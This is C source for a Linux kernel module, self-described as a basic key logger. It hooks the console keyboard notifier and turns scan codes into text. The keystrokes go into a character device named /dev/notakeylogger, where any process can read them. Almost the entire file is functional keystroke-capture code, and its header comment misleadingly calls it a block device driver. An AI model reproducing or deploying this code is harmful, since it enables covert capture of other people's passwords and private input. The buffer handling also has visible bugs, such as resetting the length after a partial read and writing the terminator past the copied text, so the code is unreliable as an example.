/*
 *    PURPOSE - A block device driver for a virtual block device of my own creation
 */

////////////
/* MACROS */
////////////

// GENERAL //
#define DEVICE_NAME "My Key Logger"            // Use this macro for logging
#define CHRDEV_NAME "My Log Device"            // Use this macro to log the character device
#define DEV_FILENAME "notakeylogger"           // /dev/DEV_FILENAME
#define BUFF_SIZE 16                           // Size of the out buffer

// CHAR DEVICE //
#define CDEV_BUFF_SIZE 511

/////////////
/* HEADERS */
/////////////
// Do not change the order of these includes unless you want:
// ./arch/x86/include/asm/uaccess.h:28:26: error: dereferencing pointer to incomplete type ‘struct task_struct’
// #include <asm/current.h>                        // current
// #include <linux/cred.h>                         // ???

// #include <asm/uaccess.h>                        // get_fs(), set_fs()
#include "HarkleKerror.h"                       // Kernel error macros
#include <linux/cdev.h>                         // cdev available
// #include <linux/fcntl.h>                        // filp_open(), filp_close()
#include <linux/fs.h>                           // Defines file table structures
#include <linux/kernel.h>                       // ALWAYS NEED
#include <linux/module.h>                       // ALWAYS NEED
#include <linux/semaphore.h>                    // semaphores
// #include <linux/stat.h>                         // File mode macros
#include <linux/uaccess.h>                      // copy_to_user
#include <linux/keyboard.h>                     // register_keyboard_notifier(), unregister_keyboard_notifier()

//////////////
/* TYPEDEFS */
//////////////
typedef struct _myKeyLogger
{
    unsigned char keyStr[BUFF_SIZE + 1];
} myKeyLogger, *myKeyLogger_ptr;

typedef struct _myLogDevice
{
    char logBuf[CDEV_BUFF_SIZE + 1];
    size_t bufLength;
    struct semaphore openSem;                   // No more than one user
    struct semaphore busySem;                   // One modifcation to the buffer at a time
    dev_t dev_num;                              // Will hold device number that kernel gives us
    int major_num;                              // Major number assigned to the device
    int minor_num;                              // Minor number assigned to the device
} myLogDevice, *myLogDevice_ptr;

/////////////////////////
/* FUNCTION PROTOTYPES */
/////////////////////////
// PURPOSE - LKM init function
static int __init key_logger_init(void);
// PURPOSE - LKM exit function
static void __exit key_logger_exit(void);
// PURPOSE - Translate scan code to 'key' string
// RETURN - 1 for unsupported value, 0 on success, -1 on failure
static int translate_code(unsigned char scanCode, char *buf);
// PURPOSE - Respond to a key press notification
int kl_module(struct notifier_block *notifBlock, unsigned long code, void *_param);
// PURPOSE - fops.open for the character device
// INPUT
//  inode - reference to the file on disk and contains information about that file
//  filp - represents an abstract open file
int device_open(struct inode *inode, struct file *filp);
ssize_t device_read(struct file* filp, char* bufStoreData, size_t bufCount, loff_t* curOffset);
// PURPOSE - fops.write for the character device
// NOTE - Is it bad that I'm defining a do-nothing write function?  Should I just leave fops.write == NULL?
ssize_t device_write(struct file* filp, const char* bufSourceData, size_t bufCount, loff_t* curOffset);
int device_close(struct inode *inode, struct file *filp);
// PURPOSE - Write the contents of srcBuf to dstDev.logBuf with care for buffer overruns
// OUTPUT - Number of characters printed on success, -1 on failure
static int write_to_chrdev(myLogDevice_ptr dstDev, char *srcBuf);

/////////////
/* GLOBALS */
/////////////
myKeyLogger myKL;
myLogDevice myLD;
int shift;
// Register this with the keyboard driver
static struct notifier_block kl_notif_block = { .notifier_call = kl_module };
struct cdev *myCdev;            // My character device driver
// This tells the kernel which functions to call when a user operates on our device file_operations
struct file_operations fops =
{
    .owner = THIS_MODULE,       // Prevent unloading of this module when operations are in use
    .open = device_open,        // Points to the method to call when opening the device
    .release = device_close,    // Points to the method to call when closing the device
    .write = device_write,      // Points to the method to call when writing to the device
    .read = device_read         // Points to the method to call when reading from the device
};
static struct class *cfake_class = NULL;

//////////////////////////
/* FUNCTION DEFINITIONS */
//////////////////////////
static int __init key_logger_init(void)
{
    int retVal = 0;
    // unsigned char i = 0;  // DEBUGGING
    struct device *device = NULL;  // device_create() return value
    
    HARKLE_KINFO(DEVICE_NAME, "Key logger loading");  // DEBUGGING

    ////////////////////////
    // Initialize Globals //
    ////////////////////////
    // 1. Initialize myKeyLogger struct
    memset(myKL.keyStr, 0x0, BUFF_SIZE * sizeof(char));
    // 2. shift
    shift = 0;

    /////////////////////////////////////////////////////////
    // Add to the list of console keyboard event notifiers //
    /////////////////////////////////////////////////////////
    if (!retVal)
    {
        register_keyboard_notifier(&kl_notif_block);
    }

    ////////////////////////////
    // Setup character device //
    ////////////////////////////
    // 1. Prepare the struct
    if (!retVal)
    {
        HARKLE_KINFO(CHRDEV_NAME, "Preparing character device");  // DEBUGGING

        // Initialize the semaphores
        sema_init(&myLD.openSem, 1);
        sema_init(&myLD.busySem, 1);

        // Memset the buffer
        memset(myLD.logBuf, 0x0, CDEV_BUFF_SIZE + 1);

        // Set buf length
        myLD.bufLength = 0;
    }

    // 2. Get a major number for our device
    if (!retVal)
    {
        // Use dynamic allocation to assign our device a major number
        retVal = alloc_chrdev_region(&(myLD.dev_num), 0, 1, CHRDEV_NAME);
        if (retVal < 0)
        {
            HARKLE_KERROR(CHRDEV_NAME, key_logger_init, "Failed to allocate a major number for the character device");
        }
        else
        {
            myLD.major_num = MAJOR(myLD.dev_num);
            myLD.minor_num = MINOR(myLD.dev_num);
            retVal = 0;
        }
    }

    // 3. Create device class (before allocation of the array of devices)
    if (!retVal)
    {
        cfake_class = class_create(THIS_MODULE, CHRDEV_NAME);
        if (IS_ERR(cfake_class))
        {
            HARKLE_KERROR(CHRDEV_NAME, key_logger_init, "class_create() failed");  // DEBUGGING
            retVal = PTR_ERR(cfake_class);
        }
    }

    // 4. Allocate and initialize the character device structure
    if (!retVal)
    {
        // Create our cdev structure
        myCdev = cdev_alloc();

        // Initialize the cdev structure
        if (myCdev)
        {
            cdev_init(myCdev, &fops);
        }
        else
        {
            HARKLE_KERROR(CHRDEV_NAME, key_logger_init, "Failed to allocate the cdev structure");  // DEBUGGING
            retVal = -1;
        }
    }

    // 5. Add this character device to the system
    if (!retVal)
    {
        retVal = cdev_add(myCdev, myLD.dev_num, 1);

        if (retVal < 0)
        {
            HARKLE_KERROR(CHRDEV_NAME, key_logger_init, "Unable to add cdev to kernel");  // DEBUGGING
        }
        else
        {
            // The device is now "live" and can be called by the kernel
            HARKLE_KFINFO(CHRDEV_NAME, key_logger_init, "Character device is now 'live'");
        }
    }

    // 6. Create a device and register it with sysfs 
    if (!retVal)
    {
        device = device_create(cfake_class, NULL, myLD.dev_num, NULL, DEV_FILENAME);

        if (IS_ERR(device))
        {
            retVal = PTR_ERR(device);
            HARKLE_KERROR(CHRDEV_NAME, key_logger_init, "device_create() failed");
            cdev_del(myCdev);
        }
    }
    
    //////////
    // DONE //
    //////////
    HARKLE_KINFO(DEVICE_NAME, "Key logger loaded");  // DEBUGGING
    return retVal;
}

static void __exit key_logger_exit(void)
{
    HARKLE_KINFO(DEVICE_NAME, "Key logger unloading");  // DEBUGGING

    /////////////////////////////
    // Unregister the notifier //
    /////////////////////////////
    unregister_keyboard_notifier(&kl_notif_block);

    ///////////////////////////////////
    // Teardown the character device //
    ///////////////////////////////////
    HARKLE_KFINFO(CHRDEV_NAME, key_logger_exit, "Destroying device");  // DEBUGGING
    device_destroy(cfake_class, myLD.dev_num);

    HARKLE_KFINFO(CHRDEV_NAME, key_logger_exit, "Deleting device");  // DEBUGGING
    cdev_del(myCdev);

    HARKLE_KFINFO(CHRDEV_NAME, key_logger_exit, "Destroying class");  // DEBUGGING
    class_destroy(cfake_class);

    HARKLE_KFINFO(CHRDEV_NAME, key_logger_exit, "Unregistering character device");  // DEBUGGING
    unregister_chrdev_region(myLD.dev_num, 1);

    //////////
    // DONE //
    //////////
    HARKLE_KINFO(DEVICE_NAME, "Key logger unloaded");  // DEBUGGING
    return;
}

int kl_module(struct notifier_block *notifBlock, unsigned long code, void *_param)
{
    // LOCAL VARIABLES
    int retVal = 0;
    int msgLen = 0;  // Length of human readable string from converted scan code
    struct keyboard_notifier_param *param = _param;
    int tempRetVal = 0;  // translate_code() return value

    if (!notifBlock || !_param)
    {
        retVal = NOTIFY_BAD;
        HARKLE_KERROR(DEVICE_NAME, kl_module, "NULL pointer");  // DEBUGGING
    }
    else if (!(param->down))
    {
        retVal = NOTIFY_OK;  // We don't care unless a key is being pressed down
    }
    // NOTES
    // 1. I'm sure about the differences between KBD_KEYCODE, KBD_UNBOUND_KEYCODE, KBD_KEYSYM, and KBD_POST_KEYSYM
    // but I'm seeing all four values come through in the "code" parameter
    // 2. Observation tells me I only want the KBD_KEYCODE codes (whatever those are)
    // 3. Not a lot of information to find on the matter but I found the macros here:
    // https://elixir.bootlin.com/linux/latest/source/include/linux/notifier.h
    else if (KBD_KEYCODE == code)
    {
        // 0. Set shift key
        if (param->shift)
        {
            shift = 1;
        }
        else
        {
            shift = 0;
        }

        // 1. Convert data to string
        tempRetVal = translate_code(param->value, myKL.keyStr);

        if (-1 == tempRetVal)
        {
            HARKLE_KERROR(DEVICE_NAME, kl_module, "translate_code() has failed");  // DEBUGGING
        }
        else if (0 == tempRetVal)
        {
            msgLen = strlen(myKL.keyStr);

            // 2. Write the string to the character device
            if (msgLen > 0)
            {
                tempRetVal = write_to_chrdev(&myLD, myKL.keyStr);
                if (msgLen != tempRetVal)
                {
                    HARKLE_KERROR(DEVICE_NAME, tasklet_logger, "write_to_chrdev() has failed");  // DEBUGGING
                    printk(KERN_INFO "%s: write_to_chrdev() returned %d\n", DEVICE_NAME, tempRetVal);  // DEBUGGING
                    printk(KERN_INFO "%s: The message is of length %d\n", DEVICE_NAME, msgLen);  // DEBUGGING
                }
            }
        }
        else
        {
            // Unsupported value
            // printk(KERN_DEBUG "%s: Skipping unsupported value of %u\n", DEVICE_NAME, param->value);  // DEBUGGING
        }
    }
    else
    {
        // We don't want this event, whatever it is
        // printk(KERN_DEBUG "%s: Skipping event 0x%lx", DEVICE_NAME, code);  // DEBUGGING
    }

    return retVal;
}

static int translate_code(unsigned char scanCode, char *buf)
{
    int retVal = 0;
    char *tempRetVal = NULL;

    if (buf)
    {
        // 1. Zeroize the buffer
        memset(buf, 0x0, BUFF_SIZE);

        // 2. Translate and copy in the string
        switch(scanCode)
        {
            case 0:
                tempRetVal = buf; break;
            case 1:
                tempRetVal = strncpy(buf, "(ESC)", BUFF_SIZE); break;
            case 2:
                tempRetVal = strncpy(buf, (shift) ? "!" : "1", BUFF_SIZE); break;
            case 3:
                tempRetVal = strncpy(buf, (shift) ? "@" : "2", BUFF_SIZE); break;
            case 4:
                tempRetVal = strncpy(buf, (shift) ? "#" : "3", BUFF_SIZE); break;
            case 5:
                tempRetVal = strncpy(buf, (shift) ? "$" : "4", BUFF_SIZE); break;
            case 6:
                tempRetVal = strncpy(buf, (shift) ? "%" : "5", BUFF_SIZE); break;
            case 7:
                tempRetVal = strncpy(buf, (shift) ? "^" : "6", BUFF_SIZE); break;
            case 8:
                tempRetVal = strncpy(buf, (shift) ? "&" : "7", BUFF_SIZE); break;
            case 9:
                tempRetVal = strncpy(buf, (shift) ? "*" : "8", BUFF_SIZE); break;
            case 10:
                tempRetVal = strncpy(buf, (shift) ? "(" : "9", BUFF_SIZE); break;
            case 11:
                tempRetVal = strncpy(buf, (shift) ? ")" : "0", BUFF_SIZE); break;
            case 12:
                tempRetVal = strncpy(buf, (shift) ? "_" : "-", BUFF_SIZE); break;
            case 13:
                tempRetVal = strncpy(buf, (shift) ? "+" : "=", BUFF_SIZE); break;
            case 14:
                tempRetVal = strncpy(buf, "(BACK)", BUFF_SIZE); break;
            case 15:
                tempRetVal = strncpy(buf, "(TAB)", BUFF_SIZE); break;
            case 16:
                tempRetVal = strncpy(buf, (shift) ? "Q" : "q", BUFF_SIZE); break;
            case 17:
                tempRetVal = strncpy(buf, (shift) ? "W" : "w", BUFF_SIZE); break;
            case 18:
                tempRetVal = strncpy(buf, (shift) ? "E" : "e", BUFF_SIZE); break;
            case 19:
                tempRetVal = strncpy(buf, (shift) ? "R" : "r", BUFF_SIZE); break;
            case 20:
                tempRetVal = strncpy(buf, (shift) ? "T" : "t", BUFF_SIZE); break;
            case 21:
                tempRetVal = strncpy(buf, (shift) ? "Y" : "y", BUFF_SIZE); break;
            case 22:
                tempRetVal = strncpy(buf, (shift) ? "U" : "u", BUFF_SIZE); break;
            case 23:
                tempRetVal = strncpy(buf, (shift) ? "I" : "i", BUFF_SIZE); break;
            case 24:
                tempRetVal = strncpy(buf, (shift) ? "O" : "o", BUFF_SIZE); break;
            case 25:
                tempRetVal = strncpy(buf, (shift) ? "P" : "p", BUFF_SIZE); break;
            case 26:
                tempRetVal = strncpy(buf, (shift) ? "{" : "[", BUFF_SIZE); break;
            case 27:
                tempRetVal = strncpy(buf, (shift) ? "}" : "]", BUFF_SIZE); break;
            case 28:
                tempRetVal = strncpy(buf, "(ENTER)", BUFF_SIZE); break;
            case 29:
                tempRetVal = strncpy(buf, "(CTRL)", BUFF_SIZE); break;
            case 30:
                tempRetVal = strncpy(buf, (shift) ? "A" : "a", BUFF_SIZE); break;
            case 31:
                tempRetVal = strncpy(buf, (shift) ? "S" : "s", BUFF_SIZE); break;
            case 32:
                tempRetVal = strncpy(buf, (shift) ? "D" : "d", BUFF_SIZE); break;
            case 33:
                tempRetVal = strncpy(buf, (shift) ? "F" : "f", BUFF_SIZE); break;
            case 34:
                tempRetVal = strncpy(buf, (shift) ? "G" : "g", BUFF_SIZE); break;
            case 35:
                tempRetVal = strncpy(buf, (shift) ? "H" : "h", BUFF_SIZE); break;
            case 36:
                tempRetVal = strncpy(buf, (shift) ? "J" : "j", BUFF_SIZE); break;
            case 37:
                tempRetVal = strncpy(buf, (shift) ? "K" : "k", BUFF_SIZE); break;
            case 38:
                tempRetVal = strncpy(buf, (shift) ? "L" : "l", BUFF_SIZE); break;
            case 39:
                tempRetVal = strncpy(buf, (shift) ? ":" : ";", BUFF_SIZE); break;
            case 40:
                tempRetVal = strncpy(buf, (shift) ? "\"" : "'", BUFF_SIZE); break;
            case 41:
                tempRetVal = strncpy(buf, (shift) ? "~" : "`", BUFF_SIZE); break;
            case 42:
            case 54:
                shift = 1; tempRetVal = buf; break;
            case 170:
            case 182:
                shift = 0; tempRetVal = buf; break;
            case 43:
                tempRetVal = strncpy(buf, (shift) ? "\\" : "|", BUFF_SIZE); break;
            case 44:
                tempRetVal = strncpy(buf, (shift) ? "Z" : "z", BUFF_SIZE); break;
            case 45:
                tempRetVal = strncpy(buf, (shift) ? "X" : "x", BUFF_SIZE); break;
            case 46:
                tempRetVal = strncpy(buf, (shift) ? "C" : "c", BUFF_SIZE); break;
            case 47:
                tempRetVal = strncpy(buf, (shift) ? "V" : "v", BUFF_SIZE); break;
            case 48:
                tempRetVal = strncpy(buf, (shift) ? "B" : "b", BUFF_SIZE); break;
            case 49:
                tempRetVal = strncpy(buf, (shift) ? "N" : "n", BUFF_SIZE); break;
            case 50:
                tempRetVal = strncpy(buf, (shift) ? "M" : "m", BUFF_SIZE); break;
            case 51:
                tempRetVal = strncpy(buf, (shift) ? "<" : ",", BUFF_SIZE); break;
            case 52:
                tempRetVal = strncpy(buf, (shift) ? ">" : ".", BUFF_SIZE); break;
            case 53:
                tempRetVal = strncpy(buf, (shift) ? "?" : "/", BUFF_SIZE); break;
            case 56:
                tempRetVal = strncpy(buf, "(R-ALT)", BUFF_SIZE); break;
            case 69:
                tempRetVal = strncpy(buf, "(NUM)", BUFF_SIZE); break;
            /* Space */
            case 55:
            case 57:
            case 58:
            case 59:
            case 60:
            case 61:
            case 62:
            case 63:
            case 64:
            case 65:
            case 66:
            case 67:
            case 68:
            case 70:
            case 71:
            case 72:
                tempRetVal = strncpy(buf, " ", BUFF_SIZE); break;
            case 73:
                tempRetVal = strncpy(buf, "(PGUP)", BUFF_SIZE); break;
            case 74:
                tempRetVal = strncpy(buf, "-", BUFF_SIZE); break;
            case 75:
                tempRetVal = strncpy(buf, "(LEFT)", BUFF_SIZE); break;
            case 76:
                tempRetVal = strncpy(buf, "(KPD5)", BUFF_SIZE); break;
            case 77:
                tempRetVal = strncpy(buf, "(RIGHT)", BUFF_SIZE); break;
            case 78:
                tempRetVal = strncpy(buf, "+", BUFF_SIZE); break;
            case 79:
                tempRetVal = strncpy(buf, "(END)", BUFF_SIZE); break;
            case 80:
                tempRetVal = strncpy(buf, "(DOWN)", BUFF_SIZE); break;
            case 81:
                tempRetVal = strncpy(buf, "(PGDN)", BUFF_SIZE); break;
            case 82:
                tempRetVal = strncpy(buf, "(INS)", BUFF_SIZE); break;
            case 83:
                tempRetVal = strncpy(buf, "(DEL)", BUFF_SIZE); break;
            case 84:
                tempRetVal = strncpy(buf, "(SYSRQ)", BUFF_SIZE); break;
            default:
                retVal = 1;
                tempRetVal = buf;
                break;
        }

        if (tempRetVal != buf || NULL == tempRetVal)
        {
            retVal = -1;
        }
        else if (*tempRetVal)
        {
            // printk(KERN_INFO "%s: Translated %u into '%s'\n", DEVICE_NAME, scanCode, buf);  // DEBUGGING
        }
    }
    else
    {
        HARKLE_KERROR(DEVICE_NAME, translate_code, "NULL pointer");  // DEBUGGING
    }

    return retVal;
}

///////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////// CHARACTER DEVICE FUNCTIONS ///////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////

int device_open(struct inode *inode, struct file *filp)
{
    int retVal = 0;

    // Only allow one process to open this device by using a semaphore as mutal exclusive lock - mutext
    retVal = down_interruptible(&myLD.openSem);
    if (retVal != 0)
    {
        printk(KERN_ALERT "%s: Unable to lock device during open\n", CHRDEV_NAME);  // DEBUGGING
        retVal = -1;
    }
    else
    {
        HARKLE_KFINFO(CHRDEV_NAME, device_open, "Opened device");  // DEBUGGING
    }

    return retVal;
}

ssize_t device_read(struct file* filp, char* bufStoreData, size_t bufCount, loff_t* curOffset)
{
    // LOCAL VARIABLES
    unsigned long tempRetVal = 0;  // Return value from copy_to_user
    ssize_t retVal = 0;  // Number of bytes read
    size_t numBytesToRead = 0;  // Smallest between bufCount and myLD.bufOffset
    int i = 0;  // Index into logBuf

    if (!filp || !bufStoreData || !curOffset)
    {
        HARKLE_KERROR(CHRDEV_NAME, device_read, "NULL pointer");  // DEBUGGING
    }
    else if (bufCount < 1)
    {
        HARKLE_KERROR(CHRDEV_NAME, device_read, "Invalid destination buffer size");  // DEBUGGING
    }
    else
    {
        HARKLE_KFINFO(CHRDEV_NAME, device_read, "Reading from device");

        if (bufCount < myLD.bufLength)
        {
            numBytesToRead = bufCount;
        }
        else
        {
            numBytesToRead = myLD.bufLength;
        }

        // printk(KERN_DEBUG "%s: bufCount is %lu\n", CHRDEV_NAME, bufCount);  // DEBUGGING
        // printk(KERN_DEBUG "%s: myLD.bufLength is %lu\n", CHRDEV_NAME, myLD.bufLength);  // DEBUGGING
        // printk(KERN_DEBUG "%s: Attempting to pass %lu bytes to the user", CHRDEV_NAME, numBytesToRead);  // DEBUGGING

        if (myLD.bufLength > 0)
        {
            tempRetVal = copy_to_user(bufStoreData, myLD.logBuf, numBytesToRead);

            // Success
            if (!tempRetVal)
            {
                // Everything was read
                if (numBytesToRead == myLD.bufLength)
                {
                    HARKLE_KFINFO(CHRDEV_NAME, device_read, "Total read executed");
                    retVal = numBytesToRead;
                    myLD.logBuf[0] = 0;  // Truncate current contents
                    myLD.bufLength = 0;  // Indicate the buffer is empty
                }
                // Partial read
                else
                {
                    HARKLE_KFINFO(CHRDEV_NAME, device_read, "Partial read executed");
                    // Save the return value
                    retVal = numBytesToRead;
                    // Move everything to the front
                    while (numBytesToRead < myLD.bufLength)
                    {
                        myLD.logBuf[i] = myLD.logBuf[numBytesToRead];
                        i++;
                        numBytesToRead++;
                    }
                    // Truncate it
                    myLD.logBuf[numBytesToRead] = 0;
                    // Reset the buffer length
                    myLD.bufLength = 0;
                }
            }
            // Error condition
            else
            {
                HARKLE_KERROR(CHRDEV_NAME, device_read, "copy_to_user() failed to copy all the bytes");  // DEBUGGING
                printk(KERN_DEBUG "%s: Failed to copy %lu bytes\n", CHRDEV_NAME, tempRetVal);  // DEBUGGING
                // printk(KERN_DEBUG "%s: Log device buffer currently holds '%s'\n", CHRDEV_NAME, myLD.logBuf);  // DEBUGGING
                retVal = numBytesToRead - tempRetVal;  // Return the number of bytes read
            }
        }
        else
        {
            // printk(KERN_DEBUG "%s: Device is empty", CHRDEV_NAME);  // DEBUGGING
            HARKLE_KFINFO(CHRDEV_NAME, device_read, "Device is empty");
        }
    }
    
    return retVal;
}

ssize_t device_write(struct file* filp, const char* bufSourceData, size_t bufCount, loff_t* curOffset)
{
    HARKLE_KFINFO(CHRDEV_NAME, device_write, "Write operations not implemented for this device.");  // DEBUGGING
    return bufCount;  // Lip service
}

int device_close(struct inode *inode, struct file *filp)
{
    up(&myLD.openSem);
    HARKLE_KFINFO(CHRDEV_NAME, device_close, "Closed device");  // DEBUGGING
    return 0;
}

static int write_to_chrdev(myLogDevice_ptr dstDev, char *srcBuf)
{
    // LOCAL VARIABLES
    int retVal = 0;
    size_t srcLen = 0;  // Length of srcBuf
    size_t dstSpace = 0;  // Remaining space in the destination buffer
    char *tmp_ptr = NULL;  // Destination address for the copy

    // INPUT VALIDATION
    if (!dstDev || !srcBuf)
    {
        retVal = -1;
        HARKLE_KERROR(DEVICE_NAME, write_to_chrdev, "NULL pointer");  // DEBUGGING
    }
    else if (!(*srcBuf))
    {
        retVal = -1;
        HARKLE_KERROR(DEVICE_NAME, write_to_chrdev, "Empty source buffer");  // DEBUGGING
    }
    else
    {
        // 0. Lock it
        retVal = down_interruptible(&myLD.busySem);
        if (retVal != 0)
        {
            printk(KERN_ALERT "%s: Unable to lock device during write_to_chrdev()\n", CHRDEV_NAME);  // DEBUGGING
            retVal = -1;
        }
        else
        {
            // HARKLE_KFINFO(CHRDEV_NAME, write_to_chrdev, "Device is locked while the kernel writes to it");  // DEBUGGING

            // 1. Size the input buffer
            srcLen = strlen(srcBuf);

            // 2. Determine the remaining space in the destination buffer
            dstSpace = CDEV_BUFF_SIZE - dstDev->bufLength;

            if (dstSpace >= srcLen)
            {
                tmp_ptr = (char*)(dstDev->logBuf + dstDev->bufLength);
            }
            else
            {
                HARKLE_KWARNG(DEVICE_NAME, write_to_chrdev, "Wrapping the character device buffer.  Data lost.");  // DEBUGGING
                tmp_ptr = (char*)dstDev->logBuf;
                dstDev->bufLength = 0;  // We're losing some data
            }

            if (tmp_ptr != strncpy(tmp_ptr, srcBuf, srcLen))
            {
                HARKLE_KERROR(DEVICE_NAME, write_to_chrdev, "strncpy() has failed");
            }
            else
            {
                *(tmp_ptr + srcLen + 1) = 0;  // Nul terminate it... for safety
                dstDev->bufLength += srcLen;  // Increase the buffer length
                retVal = srcLen;
            }

            // Release the lock
            up(&myLD.busySem);
        }
    }

    return retVal;
}

module_init(key_logger_init);
module_exit(key_logger_exit);

////////////////////////
/* DRIVER INFORMATION */
////////////////////////
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Joseph 'Makleford' Harkleroad");
MODULE_DESCRIPTION("A basic key logging Linux Kernel Module");
MODULE_VERSION("1.0"); // Releasable
